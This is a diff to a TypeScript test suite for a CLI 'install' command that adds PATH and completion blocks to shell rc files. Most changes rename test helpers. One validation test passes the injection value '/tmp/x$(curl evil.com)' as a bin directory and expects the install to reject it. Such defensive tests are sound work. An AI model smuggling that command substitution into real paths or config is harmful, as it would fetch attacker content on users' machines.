@@ -2,8 +2,8 @@ import path from 'node:path';
 import { Writable } from 'node:stream';
 import { beforeEach, vi } from 'vitest';
 import { describe, expect, layer } from '@effect/vitest';
-import { ConfigProvider, Effect, Exit } from 'effect';
-import { FileSystem } from '@effect/platform';
+import { Effect, Exit } from 'effect';
+import * as FileSystem from 'effect/FileSystem';
 import { NodeOs } from 'src/services/node-os';
 import {
   installShellIntegration,
@@ -13,6 +13,7 @@ import {
 import { makeTerminalUI } from 'src/services/terminal-ui';
 import { extendConfigProvider } from 'src/services/config';
 import { cli, TestLive, MockConsole } from 'test/__utils__';
+import { liveEnvConfigProvider } from 'test/__utils__/live-env-config-provider';
 
 const makeSink = (isTTY: boolean) => {
   const chunks: string[] = [];
@@ -42,7 +43,7 @@ const TEST_EXEC_PATH = '/usr/local/bin/composio';
 const expectedRuntimeBinDir = (): string => path.dirname(TEST_EXEC_PATH);
 const InstallTestLive = (input: Parameters<typeof TestLive>[0] = {}) =>
   TestLive({
-    baseConfigProvider: ConfigProvider.fromEnv().pipe(extendConfigProvider),
+    baseConfigProvider: liveEnvConfigProvider.pipe(extendConfigProvider),
     execPath: TEST_EXEC_PATH,
     ...input,
   });
@@ -66,7 +67,7 @@ const expectNoTmpLitter = (fs: FileSystem.FileSystem, targetPath: string) =>
   });
 
 // NOTE: `@effect/vitest`'s `layer(...)` builds one shared TestLive instance
-// (home dir, MockConsole buffer, etc.) for every `it.scoped` nested inside a
+// (home dir, MockConsole buffer, etc.) for every `it.effect` nested inside a
 // single call. Sharing is only safe when a later test doesn't read state a
 // prior test mutated (MockConsole output, rc files under the shared home
 // dir) — so each independent scenario below gets its own `layer(...)` call,
@@ -88,7 +89,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell is zsh', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] creates .zshrc with PATH only by default', () =>
+      it.effect('[Then] creates .zshrc with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -118,7 +119,7 @@ describe('CLI: composio install', () => {
         })
       );
 
-      it.scoped('[Then] preserves a symlinked .zshrc', () =>
+      it.effect('[Then] preserves a symlinked .zshrc', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -143,7 +144,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell is bash', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] creates .bashrc with PATH only by default', () =>
+      it.effect('[Then] creates .bashrc with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/bash');
@@ -168,7 +169,7 @@ describe('CLI: composio install', () => {
     layer(InstallTestLive())(it => {
       // A login bash (macOS Terminal.app's default) never reads .bashrc, so
       // the PATH block only reaches it through a created .bash_profile.
-      it.scoped('[Then] .bash_profile is created alongside .bashrc', () =>
+      it.effect('[Then] .bash_profile is created alongside .bashrc', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/bash');
@@ -193,7 +194,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] bash has no login file but an existing ~/.profile', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the created .bash_profile sources ~/.profile, which stays untouched', () =>
+      it.effect('[Then] the created .bash_profile sources ~/.profile, which stays untouched', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -222,7 +223,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] bash has an existing .bash_profile', () => {
     layer(InstallTestLive())(it => {
-      it.scoped(
+      it.effect(
         '[Then] the PATH block also lands in .bash_profile, and the restart hint mentions it',
         () =>
           Effect.gen(function* () {
@@ -253,7 +254,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] bash updates a private .bash_profile', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] preserves its existing file mode', () =>
+      it.effect('[Then] preserves its existing file mode', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -275,7 +276,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] bash has only .bash_login (no .bash_profile)', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the PATH block also lands in .bash_login', () =>
+      it.effect('[Then] the PATH block also lands in .bash_login', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -303,7 +304,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] bash has both .bash_profile and .bash_login', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] only .bash_profile receives the login PATH block', () =>
+      it.effect('[Then] only .bash_profile receives the login PATH block', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -327,7 +328,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] .bash_profile is symlinked to the same file as .bashrc', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the PATH block is written exactly once, not once per alias', () =>
+      it.effect('[Then] the PATH block is written exactly once, not once per alias', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -353,7 +354,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell is fish', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] creates config.fish with PATH only by default', () =>
+      it.effect('[Then] creates config.fish with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/usr/bin/fish');
@@ -375,7 +376,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --completions is passed', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] writes PATH block and installs completions', () =>
+      it.effect('[Then] writes PATH block and installs completions', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/bash');
@@ -399,7 +400,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] fish shell installs completions', () => {
     layer(InstallTestLive())(it => {
-      it.scoped(
+      it.effect(
         '[Then] keeps PATH setup in config.fish and writes completions to composio.fish',
         () =>
           Effect.gen(function* () {
@@ -439,7 +440,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] fish config and completions are symlinked to the same file', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] keeps both PATH and completions blocks', () =>
+      it.effect('[Then] keeps both PATH and completions blocks', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -475,7 +476,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] fish shell installs completions twice', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] keeps config.fish and composio.fish idempotent', () =>
+      it.effect('[Then] keeps config.fish and composio.fish idempotent', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/usr/bin/fish');
@@ -511,7 +512,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --no-completions is passed', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] writes PATH block but skips completions', () =>
+      it.effect('[Then] writes PATH block but skips completions', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -535,7 +536,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] install is run twice (idempotency)', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] does not duplicate entries', () =>
+      it.effect('[Then] does not duplicate entries', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/bash');
@@ -562,7 +563,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] .zshrc already has a managed block recording the current bin dir', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] reports already configured and leaves the file byte-identical', () =>
+      it.effect('[Then] reports already configured and leaves the file byte-identical', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -593,7 +594,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] the managed PATH block records a stale bin dir', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] replaces only the managed block and keeps unmanaged content', () =>
+      it.effect('[Then] replaces only the managed block and keeps unmanaged content', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -625,7 +626,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] duplicate managed PATH blocks exist in one file', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] they collapse into a single current block', () =>
+      it.effect('[Then] they collapse into a single current block', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -652,7 +653,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] a user comment sits between the managed marker and the stale export', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the comment survives and the fresh assignment wins PATH precedence', () =>
+      it.effect('[Then] the comment survives and the fresh assignment wins PATH precedence', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -688,7 +689,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] a blank line sits between the managed marker and the stale export', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] nothing but the marker is removed and the fresh assignment wins', () =>
+      it.effect('[Then] nothing but the marker is removed and the fresh assignment wins', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -719,7 +720,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] an rc file carries the legacy install.sh managed block', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the legacy pair is migrated, not left behind or duplicated', () =>
+      it.effect('[Then] the legacy pair is migrated, not left behind or duplicated', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -760,7 +761,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] a legacy block sits above an existing completions block', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] migrating the PATH block leaves the completions block intact', () =>
+      it.effect('[Then] migrating the PATH block leaves the completions block intact', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -796,7 +797,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] a migrated rc file is installed into a second time', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the second run is a no-op', () =>
+      it.effect('[Then] the second run is a no-op', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -822,7 +823,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] .bashrc and .bash_profile alias one physical file with a stale managed block', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the physical file ends with exactly one current block', () =>
+      it.effect('[Then] the physical file ends with exactly one current block', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -859,7 +860,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] the atomic write cannot replace the target file', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the error propagates and no .composio-tmp file is left behind', () =>
+      it.effect('[Then] the error propagates and no .composio-tmp file is left behind', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -882,7 +883,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_CLI_INVOCATION_ORIGIN=installer delegates shell setup', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] keeps the Updated status line but suppresses the restart hint', () =>
+      it.effect('[Then] keeps the Updated status line but suppresses the restart hint', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
           vi.stubEnv('COMPOSIO_CLI_INVOCATION_ORIGIN', 'installer');
@@ -900,7 +901,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_CLI_INVOCATION_ORIGIN=installer and integration is already current', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] keeps the already-current status line', () =>
+      it.effect('[Then] keeps the already-current status line', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -926,7 +927,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_CLI_INVOCATION_ORIGIN has a non-installer value', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the restart hint still prints', () =>
+      it.effect('[Then] the restart hint still prints', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
           vi.stubEnv('COMPOSIO_CLI_INVOCATION_ORIGIN', 'agent');
@@ -944,7 +945,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell cannot be detected', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] shows manual setup instructions', () =>
+      it.effect('[Then] shows manual setup instructions', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '');
           const expectedBinDir = expectedRuntimeBinDir();
@@ -964,7 +965,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell cannot be detected but the bin dir is already on $PATH', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] reports already on PATH instead of asking for manual setup', () =>
+      it.effect('[Then] reports already on PATH instead of asking for manual setup', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '');
@@ -989,7 +990,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] stderr is captured rather than a terminal', () => {
     layer(InstallTestLive({ terminalUI: capturedStderrUI }))(it => {
-      it.scoped('[Then] still reports the rc file and how to reload the shell', () =>
+      it.effect('[Then] still reports the rc file and how to reload the shell', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
 
@@ -1003,7 +1004,7 @@ describe('CLI: composio install', () => {
         })
       );
 
-      it.scoped('[Then] still shows manual setup instructions for an unknown shell', () =>
+      it.effect('[Then] still shows manual setup instructions for an unknown shell', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '');
           const expectedBinDir = expectedRuntimeBinDir();
@@ -1020,7 +1021,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --shell zsh overrides a conflicting $SHELL', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] writes ~/.zshrc, not ~/.bashrc', () =>
+      it.effect('[Then] writes ~/.zshrc, not ~/.bashrc', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/bash');
@@ -1037,7 +1038,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --shell is parsed by the public CLI', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] a valid override reaches the requested shell integration', () =>
+      it.effect('[Then] a valid override reaches the requested shell integration', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1054,7 +1055,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --shell has an unsupported value', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the public CLI rejects it during option parsing', () =>
+      it.effect('[Then] the public CLI rejects it during option parsing', () =>
         Effect.gen(function* () {
           const exit = yield* cli(['install', '--shell', 'powershell']).pipe(Effect.exit);
           expect(Exit.isFailure(exit)).toBe(true);
@@ -1065,7 +1066,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] both completion flags are parsed by the public CLI', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] --no-completions takes precedence', () =>
+      it.effect('[Then] --no-completions takes precedence', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1083,7 +1084,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --shell and --completions are combined on the public CLI', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the overridden shell gets both the PATH block and completions', () =>
+      it.effect('[Then] the overridden shell gets both the PATH block and completions', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1103,7 +1104,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --shell bash overrides a conflicting $SHELL', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] writes ~/.bashrc, not ~/.zshrc', () =>
+      it.effect('[Then] writes ~/.bashrc, not ~/.zshrc', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -1120,7 +1121,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --shell fish is passed with $SHELL unset', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] writes config.fish', () =>
+      it.effect('[Then] writes config.fish', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '');
@@ -1137,7 +1138,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --shell is explicit and the bin dir is already on the invoking $PATH', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] still writes the requested shell, and re-running stays idempotent', () =>
+      it.effect('[Then] still writes the requested shell, and re-running stays idempotent', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/bash');
@@ -1158,7 +1159,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] auto-detected shell has its bin dir already on the invoking $PATH', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the rc file is still written, since a transient $PATH proves nothing', () =>
+      it.effect('[Then] the rc file is still written, since a transient $PATH proves nothing', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -1182,7 +1183,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] a new .bash_profile appears after .bashrc was already configured', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the new .bash_profile gets the PATH block and .bashrc is left alone', () =>
+      it.effect('[Then] the new .bash_profile gets the PATH block and .bashrc is left alone', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1213,7 +1214,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR is set to a custom directory', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] --shell zsh writes a PATH line for the custom directory', () =>
+      it.effect('[Then] --shell zsh writes a PATH line for the custom directory', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/bash');
@@ -1232,7 +1233,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR is whitespace-only', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] it is treated as unset, not as a literal bin dir', () =>
+      it.effect('[Then] it is treated as unset, not as a literal bin dir', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -1251,7 +1252,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR has surrounding whitespace around a real value', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the surrounding whitespace is trimmed before it is used', () =>
+      it.effect('[Then] the surrounding whitespace is trimmed before it is used', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -1269,7 +1270,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR is unset and ~/.local/bin/composio is the running executable', () => {
     layer(TestLive({ execPath: '.local/bin/composio' }))(it => {
-      it.scoped('[Then] the PATH line targets ~/.local/bin via a literal $HOME prefix', () =>
+      it.effect('[Then] the PATH line targets ~/.local/bin via a literal $HOME prefix', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1292,7 +1293,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] ~/.local/bin/composio is a symlink chain to the running executable', () => {
     layer(TestLive({ execPath: '.composio-dist/composio' }))(it => {
-      it.scoped('[Then] the PATH line still targets ~/.local/bin', () =>
+      it.effect('[Then] the PATH line still targets ~/.local/bin', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1319,7 +1320,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] ~/.local/bin/composio is a foreign program (e.g. a leftover pip install)', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the PATH line targets the running executable directory instead', () =>
+      it.effect('[Then] the PATH line targets the running executable directory instead', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1342,7 +1343,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR is set and ~/.local/bin/composio is also the running executable', () => {
     layer(InstallTestLive({ execPath: '.local/bin/composio' }))(it => {
-      it.scoped('[Then] the env var wins over the ~/.local/bin fallback', () =>
+      it.effect('[Then] the env var wins over the ~/.local/bin fallback', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1366,7 +1367,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR is unset and ~/.local/bin has no composio entry point', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] the PATH line targets the real binary directory', () =>
+      it.effect('[Then] the PATH line targets the real binary directory', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           vi.stubEnv('SHELL', '/bin/zsh');
@@ -1384,7 +1385,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR contains characters that expand inside double quotes', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] aborts with an error', () =>
+      it.effect('[Then] aborts with an error', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
           vi.stubEnv('COMPOSIO_BIN_DIR', '/tmp/x$(curl evil.com)');
@@ -1404,7 +1405,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR is relative', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] aborts instead of persisting a relative PATH entry', () =>
+      it.effect('[Then] aborts instead of persisting a relative PATH entry', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
           vi.stubEnv('COMPOSIO_BIN_DIR', './bin');
@@ -1422,7 +1423,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_BIN_DIR contains a PATH delimiter', () => {
     layer(InstallTestLive())(it => {
-      it.scoped('[Then] aborts instead of persisting multiple PATH entries', () =>
+      it.effect('[Then] aborts instead of persisting multiple PATH entries', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
           vi.stubEnv('COMPOSIO_BIN_DIR', '/custom/bin:/tmp/extra');
@@ -1441,7 +1442,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] the resolved bin dir contains an apostrophe', () => {
     layer(InstallTestLive({ execPath: "/opt/o'brien/bin/composio" }))(it => {
-      it.scoped("[Then] it is written verbatim, since `'` is literal inside double quotes", () =>
+      it.effect("[Then] it is written verbatim, since `'` is literal inside double quotes", () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -1458,7 +1459,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] the runtime executable resolves to an unsafe directory', () => {
     layer(InstallTestLive({ execPath: '/tmp/we`ird/composio' }))(it => {
-      it.scoped('[Then] reports an origin-neutral error', () =>
+      it.effect('[Then] reports an origin-neutral error', () =>
         Effect.gen(function* () {
           vi.stubEnv('SHELL', '/bin/zsh');
 
